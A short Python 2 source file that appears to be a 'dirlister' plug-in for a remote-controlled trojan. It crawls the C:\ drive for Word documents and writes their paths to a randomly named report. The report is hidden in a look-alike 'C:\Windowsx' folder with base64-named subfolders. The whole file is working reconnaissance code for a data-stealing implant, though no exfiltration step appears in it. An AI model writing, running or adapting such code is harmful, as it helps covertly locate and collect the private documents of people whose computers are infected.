import os, datetime, random, fnmatch, threading, time, Queue

report_name = str(random.randint(1, 100000)) + '.txt'
report_path = os.path.join('C:\\Windowsx\\aV9sdXZfdQ==\\anVzdGtpZGRpbmc=', report_name)
path_queue = Queue.Queue()
with open(report_path, 'a') as f:
    f.write("\n" + str(datetime.datetime.now()) + "\n")


def crawl_disk(disk, doc_type):

    global report_path

    for parent, directories, filenames in os.walk(disk):
        for filename in fnmatch.filter(filenames, "*%s" % doc_type):
            doc_path = str(os.path.join(parent, filename))
            path_queue.put(doc_path)

    print "Finish with disk %s" % disk
    time.sleep(random.randint(1, 5))


def write_report():

    global report_path

    f = open(report_path, 'a')

    while not path_queue.empty():
        chunk = path_queue.get()
        f.write("\n" + chunk + "\n")
        print "Written to report: %s" % chunk

    f.close()
    time.sleep(5)

    return


def run(**args):

    print "[*] In dirlister module."
    doc_type = '.docx'
    disk1 = 'C:\\'

    # Scan disk 
    t1 = threading.Thread(target=crawl_disk, args=(disk1, doc_type,))
    t1.start()

    # If there are still threads in progress, keep writing the report
    while t1.isAlive():
        t2 = threading.Thread(target=write_report)
        t2.start()
        t2.join()

    t1.join()

    return

